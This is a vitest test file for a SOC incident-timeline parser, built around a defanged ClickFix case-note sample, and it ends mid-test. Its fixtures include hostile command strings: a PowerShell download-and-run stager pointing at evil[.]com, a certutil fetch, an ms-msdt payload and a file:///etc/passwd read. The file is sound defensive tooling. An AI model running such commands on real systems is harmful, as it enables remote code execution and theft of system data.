import { describe, expect, it } from 'vitest'
import { defangText } from '../soc/toolbox'
import {
  TIMELINE_MARKER,
  type TimelineBlock,
  type TimelineEvent,
  copyForTicket,
  defangTimelineText,
  findTimelines,
  formatDay,
  indicatorSpans,
  markerFor,
  markerStyle,
  mayHoldTimeline,
  timelineAt
} from './parse'

/** The ClickFix sample from the design spec, as it sits in a case note. */
const CLICKFIX = [
  '## Findings:',
  '%% timeline %%',
  '- On 3 May 2025, 11:04 the user was observed using Microsoft Edge …',
  '- At 11:05:40, the user was observed visiting hxxps://eemmbryequo[.]shop/ (…).',
  '    - Following the navigation, the webpage hosted a script …',
  '- At 11:06:12, Execution: the user opened Run (Win+R) and pasted `powershell …` (T1204.004)',
  '- At 11:06:15, Download: the payload was fetched from promptcraft[.]online.',
  '    - Source: EDR process tree',
  '- At 11:31, Detection: XDR raised "Suspicious PowerShell download cradle" on corp-wks-102.',
  '- Response: the SOC isolated corp-wks-102 from the network.'
]

function block(...bullets: string[]): TimelineBlock {
  return findTimelines([TIMELINE_MARKER, ...bullets])[0]
}

function one(bullet: string): TimelineEvent {
  return block(`- ${bullet}`).events[0]
}

/** The text a span covers on an event's own line. */
function at(e: TimelineEvent, span: { from: number; to: number } | null): string | null {
  return span ? `- ${e.text}`.slice(span.from, span.to) : null
}

describe('findTimelines: the block', () => {
  it('reads the ClickFix sample as six events under the marker', () => {
    const [b] = findTimelines(CLICKFIX)
    expect(b.markerLine).toBe(1)
    expect(b.firstLine).toBe(2)
    expect(b.lastLine).toBe(9)
    expect(b.events.map((e) => e.line)).toEqual([2, 3, 5, 6, 8, 9])
    expect(b.events.map((e) => e.lastLine)).toEqual([2, 4, 5, 7, 8, 9])
  })

  it('takes the marker only as the exact text, surrounding whitespace allowed', () => {
    expect(findTimelines(['  %% timeline %%  ', '- a'])).toHaveLength(1)
    expect(findTimelines(['%% Timeline %%', '- a'])).toEqual([])
    expect(findTimelines(['%%timeline%%', '- a'])).toEqual([])
    expect(findTimelines(['- a', '- b'])).toEqual([])
  })

  it('accepts all three bullet markers and keeps the indent', () => {
    const b = block('* one', '* two')
    expect(b.events.map((e) => e.text)).toEqual(['one', 'two'])
    expect(block('+ one').events[0].textFrom).toBe(2)
    const nested = findTimelines([TIMELINE_MARKER, '  - one', '  - two'])[0]
    expect(nested.events.map((e) => e.indent)).toEqual(['  ', '  '])
    expect(nested.events[0].textFrom).toBe(4)
  })

  it('reads indented sub-bullets and continuation lines as details of the event above', () => {
    const b = block('- one', '    - sub', '  continued', '- two')
    expect(b.events).toHaveLength(2)
    expect(b.events[0].details).toEqual([
      { line: 2, text: 'sub', source: false },
      { line: 3, text: 'continued', source: false }
    ])
    expect(b.events[0].lastLine).toBe(3)
  })

  it('runs on across one blank line followed by another bullet', () => {
    const b = block('- one', '', '- two', '', '    - detail')
    expect(b.events.map((e) => e.text)).toEqual(['one', 'two'])
    expect(b.events[1].details.map((d) => d.text)).toEqual(['detail'])
    expect(b.lastLine).toBe(5)
  })

  it('ends at two blank lines, a paragraph, a heading or a less indented line', () => {
    expect(block('- one', '', '', '- two').events).toHaveLength(1)
    expect(block('- one', 'A paragraph.', '- two').events).toHaveLength(1)
    expect(block('- one', '', 'A paragraph.').events).toHaveLength(1)
    expect(block('- one', '## Next', '- two').events).toHaveLength(1)
    expect(block('- one', '', '## Next').lastLine).toBe(1)
    expect(findTimelines([TIMELINE_MARKER, '  - one', '- two'])[0].events).toHaveLength(1)
  })

  it('finds two timelines in one note, each with its own date', () => {
    const blocks = findTimelines([
      TIMELINE_MARKER,
      '- On 3 May 2025, 11:04 first',
      '',
      '',
      TIMELINE_MARKER,
      '- At 09:00 second'
    ])
    expect(blocks.map((b) => b.markerLine)).toEqual([0, 4])
    expect(blocks[1].events[0].time?.date).toBeNull()
  })

  it('gives a marker with no list an empty block at the marker line', () => {
    for (const lines of [[TIMELINE_MARKER], [TIMELINE_MARKER, 'Just prose.'], [TIMELINE_MARKER, '', '']]) {
      const [b] = findTimelines(lines)
      expect(b.events).toEqual([])
      expect(b.gaps).toEqual([])
      expect([b.firstLine, b.lastLine]).toEqual([0, 0])
      expect(b.summary.count).toBe(0)
    }
  })

  it('allows one blank line between the marker and the list', () => {
    expect(findTimelines([TIMELINE_MARKER, '', '- one'])[0].events).toHaveLength(1)
  })

  it('ignores a marker inside a fenced code block', () => {
    expect(findTimelines(['```', TIMELINE_MARKER, '- a', '```'])).toEqual([])
    expect(findTimelines(['~~~~', '```', TIMELINE_MARKER, '~~~~', TIMELINE_MARKER, '- b'])).toHaveLength(1)
  })

  it('ignores a marker inside YAML frontmatter', () => {
    const note = ['---', 'tags:', '  %% timeline %%', '  - malware', '---', TIMELINE_MARKER, '- a']
    expect(findTimelines(note).map((b) => b.markerLine)).toEqual([5])
    // Not frontmatter: it does not start the note, or it never closes.
    expect(findTimelines(['', '---', TIMELINE_MARKER, '- a', '---'])).toHaveLength(1)
    expect(findTimelines(['---', TIMELINE_MARKER, '- a'])).toHaveLength(1)
    expect(findTimelines(['---\r', 'a: 1', '  %% timeline %%', '  - x', '---\r'])).toEqual([])
  })

  it("takes a fenced code block in an event as its details, '#' lines and blank lines included", () => {
    const b = block(
      '- At 11:06, Execution: ran the stager',
      '  ```powershell',
      '  # stage 1',
      '  iex (iwr hxxp://evil[.]com/a.ps1)',
      '',
      '',
      '    - not a detail marker',
      '  ```',
      '- At 11:07 next',
      '- At 11:05 earlier'
    )
    expect(b.events.map((e) => [e.line, e.lastLine])).toEqual([
      [1, 8],
      [9, 9],
      [10, 10]
    ])
    expect(b.events[0].details.map((d) => d.text)).toEqual([
      '```powershell',
      '# stage 1',
      'iex (iwr hxxp://evil[.]com/a.ps1)',
      '  - not a detail marker',
      '```'
    ])
    const tab = block('- At 11:06 ran:', '\t```', '\t$a = 1', '', '', '\t$b = 2', '\t```', '- At 11:05 x')
    expect(tab.events.map((e) => e.lastLine)).toEqual([7, 8])
  })

  it('ends an unclosed fence in an event where Markdown ends the list item', () => {
    const b = block('- a', '  ```', '  code', '', 'A paragraph.', '- b')
    expect(b.events.map((e) => e.text)).toEqual(['a'])
    expect(b.lastLine).toBe(3)
    expect(block('- a', '  ```', '  code', '- b').events.map((e) => e.lastLine)).toEqual([3, 4])
    // The blank lines it holds before the next event are in the item, so the event's; after the last, they are not.
    expect(block('- a', '  ```', '  code', '', '', '- b').events.map((e) => e.lastLine)).toEqual([5, 6])
    expect(block('- a', '  ```', '  code', '', '').lastLine).toBe(3)
  })

  it('takes a fence opened on the bullet itself as the code of that event, to its closing fence', () => {
    const b = block('- ```powershell', '  # stage 1', '', '', '  iex $a', '  ```', '- At 11:07 next')
    expect(b.events.map((e) => [e.line, e.lastLine])).toEqual([
      [1, 6],
      [7, 7]
    ])
    expect(b.events[0].details.map((d) => d.text)).toEqual(['# stage 1', 'iex $a', '```'])
  })

  it('never takes a code line in an event for a Source: footer', () => {
    const b = block('- a', '  ```', '  Source: x', '  ```')
    expect(b.events[0].details.map((d) => d.source)).toEqual([false, false, false])
  })
})

describe('findTimelines: the time a bullet starts with', () => {
  it.each([
    ['3 May 2025, 11:04', { y: 2025, m: 5, d: 3 }, 664, null],
    ['May 3, 2025 11:04', { y: 2025, m: 5, d: 3 }, 664, null],
    ['3 Sept 2025 11:04', { y: 2025, m: 9, d: 3 }, 664, null],
    ['2025-05-03 11:04', { y: 2025, m: 5, d: 3 }, 664, null],
    ['2025-05-03 11:04:00', { y: 2025, m: 5, d: 3 }, 664, 0],
    ['2025-05-03T11:04:00Z', { y: 2025, m: 5, d: 3 }, 664, 0],
    ['11:05', null, 665, null],
    ['11:05:40', null, 665, 40],
    ['9:05', null, 545, null]
  ])('reads %s', (raw, date, minutes, seconds) => {
    const e = one(`${raw} the user did a thing`)
    expect(e.time).toMatchObject({ raw, date, minutes, seconds })
    expect(at(e, e.timeSpan)).toBe(raw)
    expect(e.body).toBe('the user did a thing')
  })

  it('reads milliseconds and marks the seconds span', () => {
    const e = one('At 11:05:40.123, x')
    expect(e.time).toMatchObject({ minutes: 665, seconds: 40, ms: 123 })
    expect(at(e, e.secondsSpan)).toBe(':40.123')
    expect(one('11:05:40.5 x').time?.ms).toBe(500)
    expect(one('11:05 x').secondsSpan).toBeNull()
  })

  it.each([
    ['11:04 AM', 664],
    ['11:04 PM', 1384],
    ['11:04pm', 1384],
    ['12:15 AM', 15],
    ['12:15 PM', 735],
    ['1:04 PM', 784],
    ['2:29 P.M.', 869],
    ['12:30 a.m.', 30],
    ['11:04 a.m', 664],
    ['1:50–2:10 p.m.', 830]
  ])('reads %s on a 12-hour clock', (raw, minutes) => {
    const e = one(`${raw}, x`)
    expect(e.time?.minutes).toBe(minutes)
    expect(e.time?.raw).toBe(raw)
    expect(e.body).toBe('x')
  })

  it('leaves a full stop after AM to the sentence', () => {
    expect(one('At 11:04 AM. The user clicked').time).toBeNull()
    expect(one('At 11:04 AM. The user clicked').unread).toBe('11:04')
  })

  it('reads a dotted meridiem before a kind word as the 12-hour time it is', () => {
    const b = block('- At 11:50 AM, a', '- At 2:29 P.M., Execution: payload ran.')
    expect(b.events[1]).toMatchObject({ kind: 'execution', kindExplicit: true, body: 'payload ran.' })
    expect(b.gaps[1]).toMatchObject({ label: '2 h 39 min later', outOfOrder: false })
    expect(b.summary).toMatchObject({ first: '11:50 AM', last: '2:29 P.M.', span: '2 h 39 min' })
  })

  it.each([
    ['11:06–11:08', 666, { minutes: 668, seconds: null }],
    ['11:06-11:08', 666, { minutes: 668, seconds: null }],
    ['11:06:10–11:06:40', 666, { minutes: 666, seconds: 40 }],
    ['1:50–2:10 PM', 830, { minutes: 850, seconds: null }],
    ['11:50–12:10 PM', 710, { minutes: 730, seconds: null }]
  ])('reads the range %s', (raw, minutes, end) => {
    const e = one(`${raw} the scan ran`)
    expect(e.time).toMatchObject({ raw, minutes, end })
    expect(e.body).toBe('the scan ran')
  })

  it.each([
    ['11:04 UTC', 'UTC'],
    ['11:04 GMT', 'GMT'],
    ['11:04Z', 'Z'],
    ['11:04 +05:30', '+05:30'],
    ['11:04 UTC+5', 'UTC+5'],
    ['2025-05-03T11:04:00-05:00', '-05:00']
  ])('keeps the zone of %s as written, never converted', (raw, zone) => {
    const e = one(`${raw}, x`)
    expect(e.time).toMatchObject({ raw, zone, minutes: 664 })
    expect(e.body).toBe('x')
  })

  it('keeps the zone after a range', () => {
    expect(one('11:06–11:08 UTC x').time).toMatchObject({ zone: 'UTC', minutes: 666, end: { minutes: 668 } })
  })

  it('never takes a small z or a word starting with Z for Zulu', () => {
    expect(one('11:06 z').time?.zone).toBeNull()
    expect(one('11:06 z').body).toBe('z')
    expect(one('09:00 Z-score anomaly').body).toBe('Z-score anomaly')
    expect(one('11:06 Z, x').time?.zone).toBe('Z')
  })

  it('keeps a US zone abbreviation as written', () => {
    expect(one('07:10 EDT, x')).toMatchObject({ time: { raw: '07:10 EDT', zone: 'EDT', minutes: 430 }, body: 'x' })
  })

  it('reads the time after a task box, which stays part of the bullet', () => {
    const e = block('- [x] At 11:05, Response: isolated host').events[0]
    expect(e).toMatchObject({ textFrom: 6, text: 'At 11:05, Response: isolated host', kind: 'response' })
    expect(e.time).toMatchObject({ raw: '11:05', minutes: 665 })
    expect(block('  * [ ] 11:06 notify').events[0]).toMatchObject({ textFrom: 8, body: 'notify' })
    expect(block('- [ ]').events[0]).toMatchObject({ textFrom: 5, text: '' })
    // A link is not a task box.
    expect(block('- [[Alert 4521]] fired').events[0].textFrom).toBe(2)
  })

  it('reads a date-only start as a date with no time', () => {
    const e = one('On 3 May 2025, the user enrolled a device')
    expect(e.time).toMatchObject({ date: { y: 2025, m: 5, d: 3 }, dateStated: true, minutes: null, raw: '3 May 2025' })
    expect(e.body).toBe('the user enrolled a device')
  })

  it('carries a stated date forward to the time-only bullets after it', () => {
    const b = block('- On 3 May 2025, 11:04 a', '- Response: b', '- At 11:05 c', '- On 4 May 2025 d', '- 09:00 e')
    const dates = b.events.map((e) => e.time && [e.time.date?.d, e.time.dateStated])
    expect(dates).toEqual([[3, true], null, [3, false], [4, true], [4, false]])
  })

  it.each([
    ['On 11:04 x', 'On', false],
    ['At 11:04 x', 'At', false],
    ['By 11:04 x', 'By', false],
    ['Around 11:04 x', 'Around', true],
    ['about 11:04 x', 'about', true],
    ['Approx. 11:04 x', 'Approx.', true],
    ['Approximately 11:04 x', 'Approximately', true],
    ['~11:04 x', '~', true],
    ['At around 11:04 x', 'At around', true]
  ])('reads the lead in %s', (bullet, lead, approx) => {
    const e = one(bullet)
    expect(at(e, e.lead)).toBe(lead)
    expect(e.time?.approx).toBe(approx)
    expect(e.time?.minutes).toBe(664)
    expect(e.body).toBe('x')
  })

  it('ends the time phrase at a comma, a dash, a colon and space, or a space', () => {
    for (const bullet of ['11:04, x', '11:04 - x', '11:04 – x', '11:04: x', '11:04 x']) {
      expect(one(bullet).body).toBe('x')
    }
  })

  it('never reads a time from the middle of a sentence', () => {
    for (const bullet of ['The user at 11:04 opened mail', 'At the start, 11:04 passed', 'Logged in (11:04)']) {
      const e = one(bullet)
      expect(e.time).toBeNull()
      expect(e.lead).toBeNull()
      expect(e.body).toBe(bullet)
    }
  })

  it('reads the clock after a numeric slash date and keeps the date as written, not as a day', () => {
    const e = one('03/05/2025 11:04 the user logged in')
    expect(e.time).toMatchObject({ raw: '03/05/2025 11:04', date: null, dateText: '03/05/2025', minutes: 664 })
    expect(e.unread).toBeNull()
    expect(e.body).toBe('the user logged in')
    expect(one('On 03/05/2025, the user logged in').time).toMatchObject({ dateText: '03/05/2025', minutes: null })
  })

  it.each([
    ['11:4 the user', '11:4'],
    ['25:10 the user', '25:10'],
    ['At 11:60, the user', '11:60'],
    ['13:04 PM the user', '13:04'],
    ['11:04hrs the user', '11:04hrs'],
    ['31 Feb 2025, 11:04 the user', '31 Feb 2025']
  ])('marks %s as a time it did not read', (bullet, unread) => {
    const e = one(bullet)
    expect(e.time).toBeNull()
    expect(e.unread).toBe(unread)
  })

  it('marks an unread time after a date it did read', () => {
    const e = one('On 3 May 2025, 11:4 the user')
    expect(e.time).toMatchObject({ minutes: null, date: { y: 2025, m: 5, d: 3 } })
    expect(e.unread).toBe('11:4')
  })

  it('does not take an ordinary number or an address for a time', () => {
    for (const bullet of ['5 users clicked', '10.0.0.1:443 was contacted', '2001:db8::1 answered']) {
      expect(one(bullet).unread).toBeNull()
    }
  })
})

describe('findTimelines: kind', () => {
  it.each([
    ['Detection', 'detection'],
    ['Alert', 'detection'],
    ['Response', 'response'],
    ['Containment', 'response'],
    ['Action', 'response'],
    ['Execution', 'execution'],
    ['Web', 'web'],
    ['File', 'file'],
    ['Download', 'file'],
    ['Email', 'email'],
    ['DETECTION', 'detection']
  ])('reads the explicit kind %s', (word, kind) => {
    const e = one(`At 11:06:12, ${word}: the thing happened`)
    expect(e).toMatchObject({ kind, kindExplicit: true, body: 'the thing happened' })
    expect(at(e, e.kindSpan)).toBe(`${word}:`)
  })

  it('reads an explicit kind at the start of an untimed bullet', () => {
    const e = one('Response: the SOC isolated the host')
    expect(e).toMatchObject({ kind: 'response', kindExplicit: true, kindSpan: { from: 2, to: 11 } })
  })

  it('reads a kind only right after the time phrase', () => {
    const e = one('At 11:00 the analyst wrote Detection: none')
    expect(e).toMatchObject({ kind: 'observed', kindExplicit: false, kindSpan: null })
    expect(one('file:///etc/passwd was read').kindExplicit).toBe(false)
  })

  it.each([
    ['pasted `whoami` into Run', 'execution'],
    ['ran certutil -urlcache -f', 'execution'],
    ['launched PowerShell', 'execution'],
    ['opened invoice.hta', 'execution'],
    ['dropped 44d88612fea8a8f36de82e1278abb02f', 'file'],
    ['wrote C:\\Users\\Public\\a.txt', 'file'],
    ['wrote %APPDATA%\\a.txt', 'file'],
    ['wrote /tmp/stage/a.txt', 'file'],
    ['visited https://evil.example.com/a', 'web'],
    ['connected to 203.0.113.9', 'web'],
    ['resolved promptcraft[.]online', 'web'],
    ['received mail from attacker@evil[.]com', 'email'],
    ['certutil fetched https://evil.example.com/a', 'execution'],
    ['saved 44d88612fea8a8f36de82e1278abb02f from evil[.]com', 'file'],
    ['visited hxxps://a[.]com and mailed b@c[.]com', 'web'],
    ['XDR raised an alert on the host', 'observed'],
    ['the SOC isolated and contained the host', 'observed'],
    ['the user was observed using Microsoft Edge', 'observed']
  ])('derives the kind of "%s"', (bullet, kind) => {
    expect(one(`At 11:00, ${bullet}`)).toMatchObject({ kind, kindExplicit: false, kindSpan: null })
  })

  it('lets an explicit kind win over the derived one', () => {
    expect(one('At 11:00, Web: certutil fetched https://x.example.com/').kind).toBe('web')
  })
})

describe('findTimelines: indicators, ATT&CK, key events, details', () => {
  it('reports indicator spans, defanged or real, with the live flag', () => {
    const e = one(
      'At 11:00, the user visited hxxps://eemmbryequo[.]shop/ then https://live.example.com/x and 10.0.0.1.'
    )
    expect(e.iocs.map((i) => [at(e, i.span), i.type, i.live])).toEqual([
      ['hxxps://eemmbryequo[.]shop/', 'url', false],
      ['https://live.example.com/x', 'url', true],
      ['10.0.0.1', 'ip', true]
    ])
  })

  it('reports one span per indicator, the longest, and every repeat', () => {
    const e = one('mailed user@evil[.]com twice: user@evil[.]com')
    expect(e.iocs.map((i) => [at(e, i.span), i.type])).toEqual([
      ['user@evil[.]com', 'email'],
      ['user@evil[.]com', 'email']
    ])
  })

  it('calls an indicator live only when defanging the line would change it', () => {
    // A bare domain in prose is left as written by defangText, so it is not live.
    expect(one('fetched from promptcraft.online.').iocs.map((i) => i.live)).toEqual([false])
    expect(one('mailed user@evil.com').iocs.map((i) => i.live)).toEqual([true])
  })

  it('judges each indicator on its own, not by the word it sits in', () => {
    const b = block('- At 11:05, seen 1.2.3.4,evil.com')
    expect(b.events[0].iocs.map((i) => [i.type, i.live])).toEqual([
      ['ip', true],
      ['domain', false]
    ])
    expect(b.summary.live).toBe(1)
    expect(block('- At 11:05, seen 1.2.3.4,evil.com,5.6.7.8').events[0].iocs.map((i) => i.live)).toEqual([
      true,
      false,
      true
    ])
  })

  it('counts every change Defang timeline would make, listed as an indicator or not', () => {
    expect(block('- At 11:05, opened file://evil-share/x.hta').summary.live).toBe(1)
    expect(block('- At 11:05, ran it', '    - Payload: ms-msdt:/id PCWDiagnostic').summary.live).toBe(1)
    expect(block('- At 11:05, opened file[:]//evil-share/x[.]hta').summary.live).toBe(0)
    expect(block('- At 11:05, evil.com', '- Download: promptcraft.online').summary.live).toBe(1)
  })

  it('finds indicators on any line for the renderer', () => {
    const line = '    - The script called https://x.example.com/a'
    expect(indicatorSpans(line, 6).map((i) => line.slice(i.span.from, i.span.to))).toEqual(['https://x.example.com/a'])
  })

  it('reports ATT&CK technique spans', () => {
    const e = one('At 11:06:12, ran it (T1204.004), then T1059 and not T12345 or XT1059')
    expect(e.attack.map((s) => at(e, s))).toEqual(['T1204.004', 'T1059'])
  })

  it('marks a key event by a bold start after the time and kind', () => {
    expect(one('At 11:00, **Initial access**: the user ran it').key).toBe(true)
    expect(one('At 11:00, Execution: **Payload ran**').key).toBe(true)
    expect(one('**Patient zero** identified').key).toBe(true)
    expect(one('At 11:00, the user ran **it**').key).toBe(false)
    expect(one('At 11:00, ** not closed').key).toBe(false)
  })

  it('marks Source: detail lines', () => {
    const [b] = findTimelines(CLICKFIX)
    expect(b.events[3].details).toEqual([{ line: 7, text: 'Source: EDR process tree', source: true }])
    expect(b.events[1].details[0].source).toBe(false)
  })
})

describe('findTimelines: the ClickFix sample', () => {
  const [b] = findTimelines(CLICKFIX)
  const [first, visit, exec, download, detection, response] = b.events

  it('reads each event as the spec describes', () => {
    expect(at(first, first.lead)).toBe('On')
    expect(first.time).toMatchObject({ raw: '3 May 2025, 11:04', dateStated: true, minutes: 664, seconds: null })
    expect(first.body).toBe('the user was observed using Microsoft Edge …')
    expect(visit).toMatchObject({ kind: 'web', kindExplicit: false })
    expect(visit.time).toMatchObject({ date: { y: 2025, m: 5, d: 3 }, dateStated: false, seconds: 40 })
    expect(exec).toMatchObject({ kind: 'execution', kindExplicit: true })
    expect(exec.body).toBe('the user opened Run (Win+R) and pasted `powershell …` (T1204.004)')
    expect(download).toMatchObject({ kind: 'file', kindExplicit: true })
    expect(download.iocs.map((i) => [i.type, i.live])).toEqual([['domain', false]])
    expect(detection.kind).toBe('detection')
    expect(response).toMatchObject({ kind: 'response', time: null, unread: null })
  })

  it('derives the gaps between consecutive timed events', () => {
    expect(b.gaps.map((g) => g && g.label)).toEqual([null, '+1 min', '+32 s', '+3 s', '25 min later', null])
    expect(b.gaps[4]).toMatchObject({ long: true, outOfOrder: false, approx: false, dayChange: null })
    expect(b.gaps[1]?.tooltip).toContain('11:04')
  })

  it('summarises the block', () => {
    expect(b.summary).toEqual({
      count: 6,
      date: { y: 2025, m: 5, d: 3 },
      dateText: null,
      first: '11:04',
      last: '11:31',
      span: '27 min',
      untimed: 1,
      live: 0
    })
  })

  it('copies it for a ticket as plain text', () => {
    expect(copyForTicket(b)).toBe(
      [
        'Timeline, 3 May 2025 (6 events)',
        '11:04      the user was observed using Microsoft Edge …',
        '11:05:40   the user was observed visiting hxxps://eemmbryequo[.]shop/ (…).',
        '           Following the navigation, the webpage hosted a script …',
        '11:06:12   Execution: the user opened Run (Win+R) and pasted `powershell …` (T1204.004)',
        '11:06:15   Download: the payload was fetched from promptcraft[.]online. Source: EDR process tree',
        '11:31      Detection: XDR raised "Suspicious PowerShell download cradle" on corp-wks-102.',
        '--:--      Response: the SOC isolated corp-wks-102 from the network. (time not recorded)'
      ].join('\n')
    )
  })
})

describe('gaps', () => {
  function gaps(...bullets: string[]) {
    return block(...bullets.map((b) => `- ${b}`)).gaps
  }

  it('counts seconds only when both times have them', () => {
    expect(gaps('11:05:40 a', '11:06:12 b')[1]?.label).toBe('+32 s')
    expect(gaps('11:05:40 a', '11:06 b')[1]?.label).toBe('+1 min')
    expect(gaps('11:05:40 a', '11:07:45 b')[1]?.label).toBe('+2 min 5 s')
    expect(gaps('11:04:10 a', '11:04:50 b')[1]?.label).toBe('+40 s')
  })

  it('labels minutes, hours and the same minute', () => {
    expect(gaps('11:04 a', '11:09 b')[1]?.label).toBe('+5 min')
    expect(gaps('11:04 a', '12:09 b')[1]).toMatchObject({ label: '1 h 5 min later', long: true })
    expect(gaps('11:04 a', '13:04 b')[1]?.label).toBe('2 h later')
    expect(gaps('11:04 a', '11:04 b')[1]?.label).toBe('same minute')
    expect(gaps('11:04 a', '11:04:50 b')[1]?.label).toBe('same minute')
    expect(gaps('11:04:50 a', '11:04:50 b')[1]?.label).toBe('same second')
  })

  it('marks a gap as approximate when either time is', () => {
    expect(gaps('~11:04 a', '11:09 b')[1]).toMatchObject({ label: '≈ +5 min', approx: true })
    expect(gaps('11:04 a', 'Around 11:30 b')[1]).toMatchObject({ label: '≈ 26 min later', approx: true })
  })

  it('calls a gap long from 15 minutes', () => {
    expect(gaps('11:00 a', '11:14 b')[1]).toMatchObject({ label: '+14 min', long: false })
    expect(gaps('11:00 a', '11:15 b')[1]).toMatchObject({ label: '15 min later', long: true })
  })

  it('flags a time earlier than the event above, never assuming midnight passed', () => {
    for (const pair of [
      ['11:31 a', '11:10 b'],
      ['23:50 a', '00:10 b']
    ]) {
      const g = gaps(...pair)[1]
      expect(g).toMatchObject({ label: 'earlier than the event above', outOfOrder: true, long: false })
    }
  })

  it('crosses a stated date change with a day band', () => {
    const g = gaps('On 3 May 2025, 22:00 a', 'On 4 May 2025, 11:00 b')[1]
    expect(g).toMatchObject({ label: '13 h later', long: true, dayChange: { y: 2025, m: 5, d: 4 }, outOfOrder: false })
    expect(gaps('On 4 May 2025, 09:00 a', 'On 3 May 2025, 11:00 b')[1]).toMatchObject({
      outOfOrder: true,
      dayChange: { y: 2025, m: 5, d: 3 }
    })
    expect(gaps('On 3 May 2025, 22:00 a', 'On 5 May 2025, 23:00 b')[1]?.label).toBe('2 d 1 h later')
  })

  it('never measures across an untimed event, a date-only event or an unknown day', () => {
    expect(gaps('11:00 a', 'Response: b', '11:05 c')).toEqual([null, null, null])
    expect(gaps('11:00 a', 'On 3 May 2025, b')).toEqual([null, null])
    expect(gaps('11:00 a', 'On 3 May 2025, 11:05 b')).toEqual([null, null])
  })

  it('never measures between clocks written in different zones, or a zone and none', () => {
    expect(gaps('At 11:04 UTC, alert', 'At 13:10 +02:00, response')).toEqual([null, null])
    expect(gaps('2026-10-09T11:04:00Z alert', '2026-10-09T13:10:00+02:00 response')).toEqual([null, null])
    expect(gaps('At 11:04 UTC, alert', 'At 07:10 EDT, response')).toEqual([null, null])
    expect(gaps('At 11:04 UTC, alert', 'At 11:10, response')).toEqual([null, null])
    expect(gaps('At 11:04 UTC, alert', 'At 11:10 utc, response')[1]?.label).toBe('+6 min')
    const s = block('- At 11:04 UTC, alert', '- At 13:10 +02:00, response').summary
    expect([s.first, s.last, s.span]).toEqual(['11:04 UTC', '13:10 +02:00', null])
  })
})

describe('summary', () => {
  it('counts untimed events, live indicators on events and details, and the span', () => {
    const b = block(
      '- 11:00 visited https://a.example.com/x',
      '    - then https://b.example.com/y',
      '- Response: blocked hxxps://c[.]example[.]com',
      '- 12:05:30 closed'
    )
    expect(b.summary).toMatchObject({ count: 3, date: null, first: '11:00', last: '12:05:30', untimed: 1, live: 2 })
    expect(b.summary.span).toBe('1 h 5 min')
  })

  it('spans the earliest to the latest time when events are out of order', () => {
    const s = block('- 11:04 a', '- 11:31 b', '- 11:10 c').summary
    expect([s.first, s.last, s.span]).toEqual(['11:04', '11:31', '27 min'])
  })

  it('marks approximate ends and gives no span for a single time or an unknown day', () => {
    expect(block('- ~11:04 a').summary).toMatchObject({ first: '~11:04', last: '~11:04', span: null })
    expect(block('- 11:04 a', '- On 3 May 2025, 11:30 b').summary.span).toBeNull()
    expect(block('- Response: a').summary).toMatchObject({ first: null, last: null, span: null, untimed: 1 })
  })
})

describe('timelineAt', () => {
  const blocks = findTimelines(CLICKFIX)

  it('finds the block and event for a line', () => {
    expect(timelineAt(blocks, 1)).toEqual({ block: blocks[0], event: null })
    expect(timelineAt(blocks, 4)?.event?.line).toBe(3)
    expect(timelineAt(blocks, 9)?.event?.line).toBe(9)
    expect(timelineAt(blocks, 0)).toBeNull()
    expect(timelineAt(blocks, 10)).toBeNull()
  })

  it('gives a blank line inside the list to the event above it', () => {
    const bs = findTimelines([TIMELINE_MARKER, '- one', '', '- two'])
    expect(timelineAt(bs, 2)?.event?.line).toBe(1)
  })
})

describe('formatDay and copyForTicket', () => {
  it('formats a day', () => {
    expect(formatDay({ y: 2025, m: 5, d: 3 })).toBe('3 May 2025')
    expect(formatDay({ y: 2026, m: 12, d: 31 })).toBe('31 December 2026')
  })

  it('writes a day line at a date change, widens the column and keeps approx and kinds', () => {
    const b = block(
      '- On 3 May 2025, 22:00 a',
      '- ~11:06–11:08 UTC, Web: b',
      '- On 4 May 2025, 08:00 c',
      '- 03/05/2025 d'
    )
    expect(copyForTicket(b)).toBe(
      [
        'Timeline, 3 May 2025 (4 events)',
        '22:00'.padEnd(19) + 'a',
        '~11:06–11:08 UTC'.padEnd(19) + 'Web: b',
        '4 May 2025',
        '08:00'.padEnd(19) + 'c',
        '03/05/2025',
        '--:--'.padEnd(19) + 'd (time not recorded)'
      ].join('\n')
    )
  })

  it('copies a block without a date or events', () => {
    expect(copyForTicket(block('- 11:00 a'))).toBe('Timeline (1 event)\n11:00      a')
    expect(copyForTicket(findTimelines([TIMELINE_MARKER])[0])).toBe('Timeline (0 events)')
  })

  it('writes every change of written date when numeric and named dates mix', () => {
    const lines = (text: string) => text.split('\n')
    expect(
      lines(copyForTicket(block('- At 10/9/26, 2:29 AM mail received.', '- On 12 October 2026, 09:00 Response: b')))
    ).toEqual([
      'Timeline, 10/9/26 (2 events)',
      '2:29 AM    mail received.',
      '12 October 2026',
      '09:00      Response: b'
    ])
    expect(
      lines(copyForTicket(block('- On 3 May 2025, 11:04 a', '- At 10/9/26, 2:29 AM b', '- On 3 May 2025, 11:10 c')))
    ).toEqual([
      'Timeline, 3 May 2025 (3 events)',
      '11:04      a',
      '10/9/26',
      '2:29 AM    b',
      '3 May 2025',
      '11:10      c'
    ])
  })

  it('puts a time with no date of its own before any date line', () => {
    expect(copyForTicket(block('- 11:00 x', '- On 3 May 2025, 11:04 a')).split('\n')).toEqual([
      'Timeline (2 events)',
      '11:00      x',
      '3 May 2025',
      '11:04      a'
    ])
    // An untimed event says nothing about the day, so the first date still heads the copy.
    expect(copyForTicket(block('- Response: x', '- On 3 May 2025, 11:04 a')).split('\n')[0]).toBe(
      'Timeline, 3 May 2025 (2 events)'
    )
  })

  it('copies the code in an event whole, its indent kept', () => {
    const b = block('- 11:06 ran:', '  ```powershell', '  if ($a) {', '    iex $b', '  }', '  ```', '- 11:07 next')
    expect(copyForTicket(b).split('\n')).toEqual([
      'Timeline (2 events)',
      '11:06      ran:',
      '           ```powershell',
      '           if ($a) {',
      '             iex $b',
      '           }',
      '           ```',
      '11:07      next'
    ])
  })
})

describe('dates written as numbers', () => {
  const block = (...bullets: string[]) => findTimelines([TIMELINE_MARKER, ...bullets])[0]

  it('reads the time after 10/9/26 and keeps the date as written, never as a day', () => {
    const b = block('- At 10/9/26, 2:29 AM the vendor account sent an email.', '- 2:41 AM the user opened the link.')
    const [a, c] = b.events
    expect(a.unread).toBeNull()
    expect(a.time).toMatchObject({
      raw: '10/9/26, 2:29 AM',
      date: null,
      dateText: '10/9/26',
      dateStated: true,
      minutes: 149
    })
    expect(c.time).toMatchObject({ date: null, dateText: '10/9/26', dateStated: false, minutes: 161 })
    // One written date is one day whichever way it reads, so the gap is safe.
    expect(b.gaps[1]?.label).toBe('+12 min')
    expect(b.summary).toMatchObject({
      date: null,
      dateText: '10/9/26',
